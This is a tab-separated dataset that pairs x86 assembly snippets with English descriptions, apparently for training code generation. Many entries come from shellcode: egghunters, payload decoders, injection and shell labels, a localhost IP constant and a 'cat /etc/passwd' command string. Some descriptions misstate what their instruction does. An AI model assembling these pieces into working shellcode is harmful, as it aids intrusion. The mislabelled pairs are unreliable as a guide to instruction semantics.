SNIPPETS	INTENTS
_appendfile:	define the _appendfile label
_build:	define the _build label
_child:	define the _child label
_close:	define the _close label
_cmd:	define the _cmd label
_continue:	define the _continue label
_dup2_loop:	define the _dup2_loop label
_egg:	define the _egg label
_exec:	define the _exec label
_execline:	define the _execline label
_exit:	define the _exit label
_file:	define the _file label
_ip equ 0x0100007f	define ip equal to 0x0100007f
_isegg:	define the _isegg label
_load_data:	define the _load_data label
_next:	define the _next label
_param:	define the _param label
_params:	define the _params label
_parent_read:	define the _parent_read label
_parent:	define the _parent label
_random:	define the _random label
_return:	define the _return label
_setsockopt:	define the _setsockopt label
_shell:	define the _shell label
_socket:	define the _socket label
_start:	_start function
_start:	define the _start label
_user:	define the _user label
_while_loop:	define the _while_loop label
_write:	define the _write label
1:	define the label 1
1:	define the numeric label 1
2:	define the label 2
2:	define the numeric label 2
3:	define the label 3
3:	define the numeric label 3
a_letter db 'd'	allocate one byte of memory for a_letter variable and initialize it to 'd'
add [ebp-4], esi	add esi into memory address ebp-4
add ah, bh	add the contents of the bh register into the ah register
add al, 0x25	add 0x25 to the al register
add al, 0x3	add 0x3 to the contents in al and save the result in al
add al, 0x33	add 0x33 to the contents in al and save the result in al
add al, 0x40	add 0x40 to the al register
add al, 0x66	add 0x66 to the contents in al and save the result in al
add al, 0xa	add 0xa to the al register
add al, 0xb	add 0xb to the al register
add al, 2	add the value 2 to the contents of the al register
add al, byte '0'	add byte '0' to al
add al, byte [edi]	add the byte in edi to the al register
add ax, [di + 20]	add memory[di + 20] to ax
add ax, 01	add 01 to ax
add ax, bx	add the contents of bx into ax
add bl, 0x2	add 0x2 to the contents in bl and save the result in bl
add bx, ax	add ax to bx
add byte [esi], 2	add the byte value 2 to the esi register
add byte [var], 10	add 10 to the single byte stored at memory address var
add byte [var], 20	add 20 to the single byte stored at memory address var
add byte [var], 30	add 30 to the single byte stored at memory address var
add byte_value, 65	add an immediate operand 65 to byte_value
add byte_value, dl	add the register dl in the memory location byte_value
add cl, 0x2	add 0x2 to the contents in cl and save the result in cl
add cl, 0xb8	add 0xb8 to the cl register
add dx, 0x1b	add the value 0x1b into the dx register
add dx, 0x2f2f	add 0x2f2f to the contents in dx and save the result in dx
add eax, [ebp-4]	add the contents of the local variable stored at ebp-4 into eax
add eax, 0x10	add 0x10 to eax
add eax, 0x12345678	add 0x12345678 to the contents in eax and save the result in eax
add eax, 0x2d383638	add 0x2d383638 to the contents in eax and save the result in eax
add eax, 0x31179798	add 0x31179798 to the contents in eax and save the result in eax
add eax, 10	add 10 to eax
add eax, 10	add 10 to the contents of eax
add eax, 16	add 16 to eax
add eax, 2	add 2 to the contents of the eax register
add eax, 2	add 2 to the eax register
add eax, 2	add decimal 2 to eax register
add eax, 24	add 24 to eax
add eax, 4	add 4 to eax
add eax, 40000h	add 40000h to eax register
add eax, 48	add 48 to eax
add eax, 48	add decimal 48 to eax
add eax, c	add c to eax
add eax, ebx	add ebx to eax
add eax, ebx	add ebx to eax and store the result in eax
add eax, ebx	add the contents of ebx to the contents of eax
add eax, edx	add edx to eax
add eax, edx	add the contents of edx to the contents of eax
add eax, edx	add the contents of the edx register to the contents of eax register
add eax, esi	add the contents of esi to the contents of eax
add eax, esi	add the contents of the esi register to the contents of eax register
add ebp, 0x2	add 0x2 to the contents of ebp
add ebx, 0x2	add 0x2 to the contents in ebx and save the result in ebx
add ebx, 16	add 16 to ebx
add ebx, 2	add 2 to the contents of the ebx register
add ebx, 2	add decimal integer 2 to ebx
add ebx, 24	add 48 to ebx
add ebx, 3	add 3 to the contents of the ebx register
add ebx, 5	add decimal integer 5 to ebx
add ebx, ecx	add ecx to ebx
add ecx, 1	add the value 1 into the ecx register
add ecx, 16	add 16 to ecx
add ecx, ebx	add ebx to ecx
add edi, edi	add the contents of edi to the contents of edi
add edi, edi	add the contents of the edi register to the contents of edi register
add edx, 16	set edx to next 16 byte block
add edx, 32	add 32 to edx
add edx, 48	add 48 to edx
add edx, 64	add 64 to the contents of the edx register
add edx, eax	add the contents of eax to the contents of edx
add edx, eax	add the contents of the eax register to the contents of edx register
add edx, eax	add the contents of the eax register to the edx register
add edx, ecx	add ecx to edx
add esi, 0x21354523	add 0x21354523 to the contents in esi and save the result in esi
add esi, 0x21354523	add 0x21354523 to the contents of esi
add esi, 0x30	add 0x30 to esi
add esi, 0x33333333	add 0x33333333 value to esi
add esi, 0x3f3f3f3f	add 0x3f3f3f3f to the contents in esi and save the result in esi
add esi, 4	add 4 to esi
add esi, 4	add 4 to the contents of the esi register
add esi, eax	add eax to esi
add esi, eax	add the contents of the eax register to the contents of esi register
add esp, 0x20	add 0x20 to the contents in esp and save the result in esp
add esp, 3	add 3 to the contents of esp
add esp, 3	add 3 to the contents of the esp register
add esp, 4	add 4 to the esp register
add marks, 10	add 10 to the variable marks
addr: db 0x1	define the byte addr and initialize it to 0x1
all:	define the all label
an_integer dd 12425	define the doubleword an_integer and initialize it to 12425
and al, 0fh	perform a logical and operation between the al register and the 0fh value and store the result in the al register
and ax, 1	perform logical and between ax and 1
and eax, 0000000fh	mask out lowest 4 bits of the eax register
and eax, 0fh	clear all but the last 4 bits of eax
and eax, 3f465456	perform and operation between eax and 3f465456 and save the result in eax
and eax, 40392b29	perform and operation between eax and 40392b29 and save the result in eax
and ebx, 0000000fh	mask out lowest 4 bits of the ebx register
and ecx, 0000000fh	mask out lowest 4 bits of the ecx register
and edx, 0000000fh	mask out lowest 4 bits of the edx register
and mask1, 128	perform and operation on the variable mask1 and 128
arr dd 100	define the doubleword arr and initialize it to 100
arr dd 50	define the doubleword arr and initialize it to 50
arr1 resb 400	reserve the array arr1 of 400 uninitialized bytes
array dd 20	define the doubleword arr and initialize it to 20
array word 20	define an array of 20 initialized word
array word 5	define an array of 5 initialized word
b: dd 0x0	create variable b in memory and initialize to zero
big_number dd 123456789	define the doubleword variable big_number and initialize it to 123456789
bignum: resw 1	reserve 1 word at location bignum
buffer: resb 64	reserve 64 bytes for buffer
buffersize: dw 1024	declare buffersize to be a word containing 1024
byte_table db 14, 15, 22, 45	define a tables of bytes byte_table and initialize to 14, 15 and 22
byte_value db 150	define the byte value byte_value and initialize it to 150
bytes db 10	define the byte value bytes and initialize it to 10
bytes db 20	define the byte value bytes and initialize it to 20
call _appendfile	call the _appendfile function
call _build	call the _build function
call _continue	call _continue
call _continue	call the _continue function
call _exec	call the _exec function
call _exit	call _exit
call _malloc	call _malloc
call _myfunc	call the _myfunc function
call _params	call the _params function
call _printf	call the _printf function
call _write	call the _write function
call [esp]	call the function in esp
call atoi	call the atoi function
call code	call the code function
call cont	call the cont function
call decoder	call the decoder function
call doit	call the doit function
call egghunter	call the egghunter function
call esi	call the esi function
call esi	call the function in esi
call esp	call the esp function
call execute	call the execute function
call internetreadfile	call function internetreadfile
call iprint	call the iprint function
call iprintlf	call the iprintlf function
call jmp_search	call jmp_search
call jmp_search	call the jmp_search function
call loader	call the loader function
call main	call the main function
call me	call the me function
call my_subroutine	call my_subroutine
call near stageaddress	call the near function
call one	call the one function
call prepare	call the prepare function
call quit	call the quit function
call set_argv	call set_argv
call set_argv	call the set_argv function
call shell_ret	call the shell_ret function
call shellcode	call the shellcode function
call sprint	call the sprint function
call sprintlf	call the sprintlf function
call start	call the start function
call strlen	call the strlen function
call two	call the two function
call write	call the write function
call writestring	call the writestring function
call writestring	call writestring
call_decoded:	define the call_decoded label
call_decoder:	define call_decoder function
call_decoder:	define the call_decoder label
call_egghunter:	define the call_egghunter label
call_shellcode:	declare the call_shellcode label
call_shellcode:	define call_shellcode function
call_shellcode:	define call_shellcode label
call_shellcode:	define the call_shellcode label
call_write:	define the call_write label
callit:	define the callit label
callme:	define the callme label
callpop:	define the callpop function
callpop:	define the callpop label
cdq	clear the edx register
cdq	extend the sign bit of eax into the edx register
cdq	extend the sign bit of eax register into the edx register
cdq	extend the sign bit of the eax register into the edx register
check_even_odd:	define check_even_odd function
child:	define the child function
child:	define the child label
chmod_call equ 15	define chmod_call equal to 15
choice db 'y'	define variable choice of 1 byte and initialize to y
cld	clear the direction flag
cld	direction flag equal to zero
cld	set the direction flag to zero
close_syscall equ 6	define close_syscall equal to 6
closefile:	define the closefile function
closefile:	define the closefile label
cmd:	define the cmd label
cmd: db 'cat /etc/passwd'	declare cmd string and initialize it to 'cat /etc/passwd'
cmd: db 'cat /etc/passwd'	define cmd as the byte string 'cat /etc/passwd'
cmp [ebp+arg_0], 1	compare the contents stored at ebp+arg_0 with 1
cmp [ebp+var_a], 0	compare if the contents at memory location ebp+var_a is 0
cmp [ebp+var_a], 0	compare the contents at memory location ebp+var_a with 0
cmp [ebp+var_a], 0 \n jnz short loc_4010E5	jump short to the memory location loc_4010E5 if the contents of the memory address ebp+var_a is not equal to zero
cmp [ebp+var_a], 0 \n jnz short loc_4010E5	if the contents of the memory address ebp+var_a is not equal to zero then jump short to the memory location loc_4010E5
cmp [esi], edx	compare the contents at memory location esi and the contents of the edx register
cmp [esi], edx	compare the contents at memory location esi with edx
cmp al, 0x38 \n je 0x40 \n push byte 0x1	jump to the memory address 0x40 if the contents of the al register is equal to the value 0x38 else push the byte representation of the value 0x1 onto the stack
cmp al, 0x38 \n je 0x40 \n push byte 0x1	if the contents of the al register is equal to the value 0x38 then jump to the memory address 0x40 else push the byte representation of the value 0x1 onto the stack
cmp al, 0xaa \n je decode_insertion \n xor al, bl	jump to the decode_insertion label if the contents of the al register is equal to the vale 0xaa else perform a logical xor operation between the al register and the bl register and store the result in the al register
cmp al, 0xaa \n je decode_insertion \n xor al, bl	if the contents of the al register is equal to the vale 0xaa then jump to the decode_insertion label else perform a logical xor operation between the al register and the bl register and store the result in the al register
cmp al, 0xf2	compare if the contents of al with 0xf2
cmp al, 0xf2	compare the contents of the al register and 0xf2
cmp al, 0xf2	compare the contents of the al register with the value 0xf2
cmp al, 0xf2 \n je _start	jump to the _start label if the contents of the al register is equal to the value 0xf2
cmp al, 0xf2 \n je _start	if the contents of the al register is equal to the value 0xf2 then jump to the _start label
cmp al, 0xf2 \n je _start \n mov eax, 0x50905090	jump to the _start label if the contents of the al register is equal to the value 0xf2 else move the value 0x50905090 into the eax register
cmp al, 0xf2 \n je _start \n mov eax, 0x50905090	if the contents of the al register is equal to the value 0xf2 then jump to the _start label else move the value 0x50905090 into the eax register
cmp al, 0xf2 \n je fillOnes	jump to the fillOnes label if the contents of the al register is equal to the value 0xf2
cmp al, 0xf2 \n je fillOnes	if the contents of the al register is equal to the value 0xf2 then jump to the fillOnes label
cmp al, 0xf2 \n je fillOnes \n mov eax, 0x59935193	jump to the fillOnes label if the contents of the al register is equal to 0xf2 else move the value 0x59935193 into the eax register
cmp al, 0xf2 \n je fillOnes \n mov eax, 0x59935193	if the contents of the al register is equal to 0xf2 then jump to the fillOnes label else move the value 0x59935193 into the eax register
cmp al, 0xf2 \n je next_page	jump to the label next_page if the contents of the al register is equal to the value 0xf2
cmp al, 0xf2 \n je next_page	if the contents of the al register is equal to the value 0xf2 then jump to the label next_page
cmp al, 0xf2 \n jz _start	jump to the _start label if the contents of the al register is equal to the value 0xf2
cmp al, 0xf2 \n jz _start	if the contents of the al register is equal to the value 0xf2 then jump to the _start label
cmp al, 0xf2 \n jz incpage	jump to the incpage label if the contents of the al register is equal to the value 0xf2
cmp al, 0xf2 \n jz incpage	if the contents of the al register is equal to the value 0xf2 then jump to the incpage label
cmp al, 9 \n jg l1	jump to the label l1 if the contents of the al register is greater than the decimal value 9
cmp al, 9 \n jg l1	if the contents of the al register is greater than the decimal value 9 then jump to the label l1
cmp al, 9 \n jge l1	jump to the label l1 if the contents of the al register is greater than or equal to the decimal value 9
cmp al, 9 \n jge l1	if the contents of the al register is greater than or equal to the decimal value 9 then jump to the label l1
cmp al, bl \n ja l2 \n add eax, 3	jump to the l2 label if the unsigned contents of the al register is greater than the unsigned contents of the bl register else add the value 3 to the eax register
cmp al, bl \n ja l2 \n add eax, 3	if the unsigned contents of the al register is greater than the unsigned contents of the bl register then jump to the l2 label else add the value 3 to the eax register
cmp al, bl \n jb l2	jump to the label l2 if the unsigned contents of the al register is lower than the unsigned contents of the bl register
cmp al, bl \n jb l2	if the unsigned contents of the al register is lower than the unsigned contents of the bl register then jump to the label l2
cmp al, cl	compare the contents of al with the cl register
cmp al, cl	compare the contents of the al register and the contents of the cl register
cmp al, cl \n jne short decode \n jmp shellcode	jump short to the decode label if the contents of the al register is not equal to the contents of the cl register else jump to the shellcode label
cmp al, cl \n jne short decode \n jmp shellcode	if the contents of the al register is not equal to the contents of the cl register then jump short to the decode label else jump to the shellcode label
cmp ax, bx \n jne l3	jump to the l3 label if the contents of the ax register is not equal to the contents of the bx register
cmp ax, bx \n jne l3	if the contents of the ax register is not equal to the contents of the bx register then jump to the l3 label
cmp ax, bx \n jne l3 \n jmp while	jump to the l3 label if the contents of the ax register is not equal to the contents of the bx register else jump to the while label
cmp ax, bx \n jne l3 \n jmp while	if the contents of the ax register is not equal to the contents of the bx register then jump to the l3 label else jump to the while label
cmp bh, al	compare the contents of bh and the contents of al
cmp bl, 0x1f	compare the contents of bl and 0x1f
cmp bl, 0x1f \n jb 0xf3 \n add al, 0x40	jump to the memory address 0xf3 if the unsigned contents of the bl register is lower than the unsigned value 0x1f else add the 0x40 value to the al register
cmp bl, 0x1f \n jb 0xf3 \n add al, 0x40	if the unsigned contents of the bl register is lower than the unsigned value 0x1f then jump to the memory address 0xf3 else add the 0x40 value to the al register
cmp bl, 0xaa \n je shellcode	jump to the shellcode label if the contents of the bl register is equal to the value 0xaa
cmp bl, 0xaa \n je shellcode	if the contents of the bl register is equal to the value 0xaa then jump to the shellcode label
cmp bl, 0xbb \n je xordecode \n jmp notdecode	jump to the xordecode label if the contents of the bl register is equal to the value 0xbb else jump to the notdecode label
cmp bl, 0xbb \n je xordecode \n jmp notdecode	if the contents of the bl register is equal to the value 0xbb then jump to the xordecode label else jump to the notdecode label
cmp bl, 48	compare ebx register's lower half value against ascii value 48
cmp bl, 57	compare ebx register's lower half value against ascii value 57
cmp bl, 78h \n jg short loc_402B1D	jump to the memory location loc_402B1D if the contents of the bl register is greater than the value 78h
cmp bl, 78h \n jg short loc_402B1D	if the contents of the bl register is greater than the value 78h then jump to the memory location loc_402B1D
cmp bl, 78h \n jge short loc_402B1D	jump to the memory location loc_402B1D if the contents of the bl register is greater than or equal to the value 78h
cmp bl, 78h \n jge short loc_402B1D	if the contents of the bl register is greater than or equal to the value 78h then jump to the memory location loc_402B1D
cmp bl, 78h \n jl short loc_402B1D	jump to the memory location loc_402B1D if the contents of the bl register is less than the value 78h
cmp bl, 78h \n jl short loc_402B1D	if the contents of the bl register is less than the value 78h then jump to the memory location loc_402B1D
cmp bl, 78h \n jle short loc_402B1D	jump to the memory location loc_402B1D if the contents of the bl register is less than or equal to the value 78h
cmp bl, 78h \n jle short loc_402B1D	if the contents of the bl register is less than or equal to the value 78h then jump to the memory location loc_402B1D
cmp bl, al \n je loop_2	jump to the loop_2 label if the contents of the bl register is equal to the contents of the al register
cmp bl, al \n je loop_2	if the contents of the bl register is equal to the contents of the al register then jump to the loop_2 label
cmp bl, al \n je loop_2 \n jmp short not_found	jump to the loop_2 label if the contents of the bl register is equal to the contents of the al register else jump short to the not_found label
cmp bl, al \n je loop_2 \n jmp short not_found	if the contents of the bl register is equal to the contents of the al register then jump to the loop_2 label else jump short to the not_found label
cmp byte [buff], 61h	compare the byte at the memory location buff with 61h
cmp byte [buff], 7ah	compare the byte at the memory location buff with 7ah
cmp byte [eax], 0	compare the byte pointed to by eax at this address against zero
cmp byte [ebp+ecx], 61h	compare the byte at the memory location ebp+ecx with 61h
cmp byte [ebp+ecx], 7ah	compare the byte at the memory location ebp+ecx with 7ah
cmp BYTE [edx], 0x2e \n jne l2	jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e
cmp BYTE [edx], 0x2e \n jne l2	if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e then jump to the l2 label
cmp BYTE [edx], 0x2e \n jne l2 \n jmp while	jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e else jump to the while label
cmp BYTE [edx], 0x2e \n jne l2 \n jmp while	if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e then jump to the l2 label else jump to the while label
cmp byte [esi], 0x7	compare the byte in esi with 0x7
cmp BYTE [esi], 0x7 \n jl lowbound	jump to the lowbound label if the byte starting at the address contained in the esi register is lower than the byte value 0x7
cmp BYTE [esi], 0x7 \n jl lowbound	if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label
cmp BYTE [esi], 0x7 \n jl lowbound \n sub BYTE [esi], 0x7	jump to the lowbound label if the byte starting at the address contained in the esi register is lower than the byte value 0x7 else subtract the byte value 0x7 from byte starting at the address contained in the esi register
cmp BYTE [esi], 0x7 \n jl lowbound \n sub BYTE [esi], 0x7	if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label else subtract the byte value 0x7 from byte starting at the address contained in the esi register
cmp BYTE [esi], 0x7 \n jle lowbound	jump to the lowbound label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0x7
cmp BYTE [esi], 0x7 \n jle lowbound	if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0x7 then jump to the lowbound label
cmp byte [esi], 0xd	compare the byte at the address esi and 0xd
cmp byte [esi], 0xD \n jl wrap_around	jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than the byte value 0xD
cmp byte [esi], 0xD \n jl wrap_around	if the byte starting at the address contained in the esi register is lower than the byte value 0xD then jump to the wrap_around label
cmp byte [esi], 0xD \n jl wrap_around \n sub byte [esi], 0xD	jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than the byte value 0xD else subtract the byte value 0xD from byte starting at the address contained in the esi register
cmp byte [esi], 0xD \n jl wrap_around \n sub byte [esi], 0xD	if the byte starting at the address contained in the esi register is lower than the byte value 0xD then jump to the wrap_around label else subtract the byte value 0xD from byte starting at the address contained in the esi register
cmp byte [esi], 0xD \n jle wrap_around	jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0xD
cmp byte [esi], 0xD \n jle wrap_around	if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0xD then jump to the wrap_around label
cmp BYTE al, 2 \n je do_inject	jump to the label do_inject if the byte representation of 2 is equal to the contents of the al register
cmp BYTE al, 2 \n je do_inject	if the byte representation of 2 is equal to the contents of the al register then jump to the label do_inject
cmp BYTE al, 2 \n je do_inject \n jmp while	jump to the label do_inject if the byte representation of 2 is equal to the contents of the al register else jump to the while label
cmp BYTE al, 2 \n je do_inject \n jmp while	if the byte representation of 2 is equal to the contents of the al register else jump to the while label then jump to the label do_inject
cmp BYTE bl, [esi] \n jne loop_1	jump to the label loop_1 if the first byte of the esi register is not equal to the contents of the bl register
cmp BYTE bl, [esi] \n jne loop_1	if the first byte of the esi register is not equal to the contents of the bl register then jump to the label loop_1
cmp cl, 0x11 \n jb 0xff \n add dl, 0x5	jump to the memory address 0xff if the unsigned contents of the cl register is lower than the unsigned value 0x11 else add the 0x5 value to the dl register
cmp cl, 0x11 \n jb 0xff \n add dl, 0x5	if the unsigned contents of the cl register is lower than the unsigned value 0x11 then jump to the memory address 0xff else add the 0x5 value to the dl register
cmp cl, 0x3 \n jne loop	jump to the loop label if the contents of the cl register is not equal to the value 0x3
cmp cl, 0x3 \n jne loop	if the contents of the cl register is not equal to the value 0x3 then jump to the loop label
cmp cl, 0x3 \n jne loop2	jump to the loop2 label if the contents of the cl register is not equal to the value 0x3
cmp cl, 0x3 \n jne loop2	if the contents of the cl register is not equal to the value 0x3 then jump to the loop2 label
cmp cl, 12 \n jg l2	jump to the label l2 if the contents of the cl register is greater than the decimal value 12
cmp cl, 12 \n jg l2	if the contents of the cl register is greater than the decimal value 12 then jump to the label l2
cmp cl, 12 \n jge l2	jump to the label l2 if the contents of the cl register is greater than or equal to the decimal value 12
cmp cl, 12 \n jge l2	if the contents of the cl register is greater than or equal to the decimal value 12 then jump to the label l2
cmp cl, dl \n jb l3	jump to the label l3 if the unsigned contents of the cl register is lower than the unsigned contents of the dl register
cmp cl, dl \n jb l3	if the unsigned contents of the cl register is lower than the unsigned contents of the dl register then jump to the label l3
cmp cl, dl \n je EncodedShellcode	jump to the EncodedShellcode label if the contents of the cl register is equal to the contents of the dl register
cmp cl, dl \n je EncodedShellcode	if the contents of the cl register is equal to the contents of the dl register then jump to the EncodedShellcode label
cmp cl, dl \n je init \n inc cl	jump to the init label if the contents of the cl register is equal to the contents of the dl register else increment the contents of the cl register
cmp cl, dl \n je init \n inc cl	if the contents of the cl register is equal to the contents of the dl register then jump to the init label else increment the contents of the cl register
cmp dl, 1 \n je exit \n jmp reading	jump to the exit label if the contents of the dl register is equal to the vale 1 else jump to the reading label
cmp dl, 1 \n je exit \n jmp reading	if the contents of the dl register is equal to the vale 1 then jump to the exit label else jump to the reading label
cmp dl, 1h	compare the contents of the dl register and 1h
cmp dl, 27 \n jg l3	jump to the label l3 if the contents of the dl register is greater than the decimal value 27
cmp dl, 27 \n jg l3	if the contents of the dl register is greater than the decimal value 27 then jump to the label l3
cmp dl, 27 \n jge l3	jump to the label l3 if the contents of the dl register is greater than or equal to the decimal value 27
cmp dl, 27 \n jge l3	if the contents of the dl register is greater than or equal to the decimal value 27 then jump to the label l3
cmp dl, cl \n jb l1 \n mov al, 0x39	jump to the label l1 if the unsigned contents of the dl register is lower than the unsigned contents of the cl register else move the value 0x39 to the al register
cmp dl, cl \n jb l1 \n mov al, 0x39	if the unsigned contents of the dl register is lower than the unsigned contents of the cl register then jump to the label l1 else move the value 0x39 to the al register
cmp dword [eax-4], egg1	compare the dword at the address [eax-4] and egg1
cmp dword [eax-4], egg1 \n jne _next \n jmp eax	jump to the _next label if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address else jump to the eax register
cmp dword [eax-4], egg1 \n jne _next \n jmp eax	if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address then jump to the _next label else jump to the eax register
cmp dword [eax-4], egg2 \n je _next \n jmp eax	jump to the _next label if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address else jump to the eax register
cmp dword [eax-4], egg2 \n je _next \n jmp eax	if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address then jump to the _next label else jump to the eax register
cmp dword [eax-4],egg1	compare the dword at the memory location [eax-4] with the value of egg1
cmp dword [eax-8], egg	compare the dword at the address [eax-8] and egg
cmp dword [eax-8], egg \n jne _next	jump to the _next label if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address
cmp dword [eax-8], egg \n jne _next	if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address then jump to the _next label
cmp dword [eax-8],egg	compare the dword at the memory location [eax-8] with the value of egg
cmp DWORD [eax], 0x4f904790 \n jne _start \n jmp eax	jump to the jne _start label if the doubleword starting at the address contained in the eax register is not equal to the doubleword value 0x4f904790 else jump to the eax register
cmp DWORD [eax], 0x4f904790 \n jne _start \n jmp eax	if the doubleword starting at the address contained in the eax register is not equal to the doubleword value 0x4f904790 then jump to the jne _start label else jump to the eax register
cmp dword [eax], ebx	compare the dword at the address [eax] and the contents of the ebx register
cmp dword [eax], ebx \n jne next_addr \n jmp eax	jump to the next_address label if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster else jump to the eax register
cmp dword [eax], ebx \n jne next_addr \n jmp eax	if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster then jump to the next_address label else jump to the eax register
cmp DWORD [eax], edx \n jne loop \n jmp eax	jump to the loop label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register
cmp DWORD [eax], edx \n jne loop \n jmp eax	if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the loop label else jump to the eax register
cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax	jump to the while label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register
cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax	jump to the search_the_egg label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register
cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax	if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the while label else jump to the eax register
cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax	if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the search_the_egg label else jump to the eax register
cmp DWORD [edx], 0x636f7270 \n je while	jump to the while label if the doubleword starting at the address contained in the edx register is equal to the doubleword value 0x636f7270
cmp DWORD [edx], 0x636f7270 \n je while	if the doubleword starting at the address contained in the edx register is equal to the doubleword value 0x636f7270 then jump to the while label
cmp dword [var], 10	compare the doubleword stored at memory location var to the integer value 10
cmp dx, 00	compare the dx value with zero
cmp dx, 0x03e8 \n je L1	jump to the L1 label if the contents of the dx register is equal to the value 0x03e8
cmp dx, 0x03e8 \n je L1	if the contents of the dx register is equal to the value 0x03e8 then jump to the L1 label
cmp eax, 0	compare eax to zero
cmp eax, 0	compare if eax is equal to 0
cmp eax, 0	compare if eax is zero
cmp eax, eax	compare the contents of eax and the contents of eax
cmp eax, eax \n jne 0x8	jump to the memory address 0x8 if the contents of the eax register is not equal to the contents of the eax register
cmp eax, eax \n jne 0x8	if the contents of the eax register is not equal to the contents of the eax register then jump to the memory address 0x8
cmp eax, eax \n jne 0x8 \n xor eax, eax	jump to the memory address 0x8 if the contents of the eax register is not equal to the contents of the eax register else zero out the eax register
cmp eax, eax \n jne 0x8 \n xor eax, eax	if the contents of the eax register is not equal to the contents of the eax register then jump to the memory address 0x8 else zero out the eax register
cmp eax, ebp \n jnz short loc_40102B	jump short to the memory location loc_40102B if the contents of the eax register is not equal to the contents of the ebp register
cmp eax, ebp \n jnz short loc_40102B	if the contents of the eax register is not equal to the contents of the ebp register then jump short to the memory location loc_40102B
cmp eax, ebx	compare eax with ebx
cmp eax, ebx	compare the contents of eax and the contents of ebx
cmp eax, ebx	compare the contents of the eax register and the contents of the ebx register
cmp eax, ebx \n je 0x47	jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register
cmp eax, ebx \n je 0x47	if the contents of the eax register is equal to the contents of the edi register then jump to the memory address 0x47
cmp eax, ebx \n je 0x47 \n xor ecx, ecx	jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register else zero out the ecx register
cmp eax, ebx \n je 0x47 \n xor ecx, ecx	if the contents of the eax register is equal to the contents of the edi register then jump to the memory address 0x47 else zero out the ecx register
cmp eax, ebx \n je all	jump to the all label if the contents of the eax register is equal to the contents of the ebx register
cmp eax, ebx \n je all	if the contents of the eax register is equal to the contents of the ebx register then jump to the all label
cmp eax, ebx \n je all \n xor eax, eax	jump to the all label if the contents of the eax register is equal to the contents of the ebx register else zero out the eax register
cmp eax, ebx \n je all \n xor eax, eax	if the contents of the eax register is equal to the contents of the ebx register then jump to the all label else zero out the eax register
cmp eax, ebx \n je child	jump to the child label if the contents of the eax register is equal to the contents of the ebx register
cmp eax, ebx \n je child	if the contents of the eax register is equal to the contents of the ebx register then jump to the child label
cmp eax, ebx \n je connect \n ja exit	jump to the connect label if the contents of the eax register is equal to the contents of the ebx register else jump to the exit label if the unsigned contents of the eax register is greater than the unsigned contents of the ebx register
cmp eax, ebx \n je connect \n ja exit	if the contents of the eax register is equal to the contents of the ebx register then jump to the connect label else jump to the exit label if the unsigned contents of the eax register is greater than the unsigned contents of the ebx register
cmp eax, ebx \n je download	jump to the download label if the contents of the eax register is equal to the contents of the ebx register
cmp eax, ebx \n je download	if the contents of the eax register is equal to the contents of the ebx register then jump to the download label
cmp eax, ebx \n je exit	jump to the exit label if the contents of the eax register is equal to the contents of the ebx register
cmp eax, ebx \n je exit	if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label
cmp eax, ebx \n je exit \n add al, 0x3	jump to the exit label if the contents of the eax register is equal to the contents of the ebx register else move the value 0x3 into the al register
cmp eax, ebx \n je exit \n add al, 0x3	if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label else move the value 0x3 into the al register
cmp eax, ebx \n je exit \n mov al, 0x4	jump to the exit label if the contents of the eax register is equal to the contents of the ebx register else move the value 0x4 into the al register
cmp eax, ebx \n je exit \n mov al, 0x4	if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label else move the value 0x4 into the al register
cmp eax, ebx \n je L1	jump to the L1 label if the contents of the eax register is equal to the contents of the ebx register
cmp eax, ebx \n je L1	if the contents of the eax register is equal to the contents of the ebx register then jump to the L1 label
cmp eax, ebx \n jne retry	jump to the retry label if the contents of the eax register is not equal to the contents of the ebx register
cmp eax, ebx \n jne retry	if the contents of the eax register is not equal to the contents of the ebx register then jump to the retry label
cmp eax, edi \n jne infinite	jump to the infinite label if the contents of the eax register is not equal to the contents of the edi register
cmp eax, edi \n jne infinite	if the contents of the eax register is not equal to the contents of the edi register then jump to the infinite label
cmp eax, edi \n jne infinite \n xor eax, eax	jump to the infinite label if the contents of the eax register is not equal to the contents of the edi register else zero out the eax register
cmp eax, edi \n jne infinite \n xor eax, eax	if the contents of the eax register is not equal to the contents of the edi register then jump to the infinite label else zero out the eax register
cmp eax,ebx	compare the contents of eax with ebx
cmp ebp, 0	compare the contents of the ebp register with the value 0
cmp ebx, 0	compare if ebx is zero
cmp ebx, 9 \n ja exit \n jmp loop	jump to the exit label if the unsigned contents of the ebx register is greater than the unsigned value 10 else jump to the loop label
cmp ebx, 9 \n ja exit \n jmp loop	if the unsigned contents of the ebx register is greater than the unsigned value 10 then jump to the exit label else jump to the loop label
cmp ecx, 0	compare ecx to 0
cmp ecx, 0	compare if ecx is zero
